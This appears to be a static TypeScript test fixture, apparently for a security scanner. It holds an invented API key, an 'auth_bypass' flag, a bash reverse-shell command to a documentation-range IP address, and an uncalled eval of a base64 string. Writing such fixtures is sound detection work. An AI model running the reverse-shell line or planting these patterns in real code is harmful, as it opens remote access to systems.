// STATIC FIXTURE ONLY. Never execute; tokens are invented.
const api_key: string = "LGFixtureKey9Z7Q2";
const auth_bypass: boolean = true;
const indicator = "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1";
function neverCalled(): unknown { return eval(atob("MQ==")); }
